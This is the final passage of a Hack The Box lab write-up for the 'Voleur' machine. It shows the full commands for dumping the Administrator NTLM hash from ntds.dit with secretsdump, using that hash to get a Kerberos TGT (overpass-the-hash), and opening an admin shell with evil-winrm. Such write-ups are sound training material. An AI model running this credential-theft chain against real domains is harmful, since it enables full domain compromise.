We'll use `impacket-secretsdump` to extract the Administrator's hash. Because we are using it locally we cannot use the `-just-dc-user` flag, so we'll extract _everything_. I've added the `grep` for the write-up's sake:
```
$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL |grep -B1  Administrator:500
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:a<REDACTED>e:e<REDACTED>2:::
```

I misunderstood the fact that NTLM authentication was disabled to mean that I couldn't use the hash to get a TGT ticket. So my first thought was to try to crack the hash, which `hashcat` and `rockyou.txt` weren't able to do. But once again off the heels of [RustyKey](/writeups/rustykey/), where I wondered if something was possible but didn't actually _try it_, I just tried it:
```
$ impacket-getTGT voleur.htb/Administrator -hashes 'a<REDACTED>e:e<REDACTED>2'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

So indeed that works. NTLM authentication is disabled, but we didn't attempt to authenticate with NTLM. We _requested a TGT ticket_ using the NTLM hash (technically, the RC4 key, which is derived from it). _Then_ we authenticated with Kerberos using that TGT. We've effectively [overpassed the hash (last paragraph)](https://attack.mitre.org/techniques/T1550/002/).

We just tried, it just worked, and we're done:
```
$ export KRB5CCNAME=Administrator.ccache
$ evil-winrm -i dc.voleur.htb -u 'Administrator'  -r VOLEUR.HTB                <SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents>  
```

## Roll the credits
- That season of HTB machines was great for cementing Active Directory basics, especially with boxes like this one putting it all together.
- Keeping notes on proper usage of tools after some trial and error (like with `smbclient` and `RunasCS`) is invaluable.
- As always, for reading this far, you're a champ.
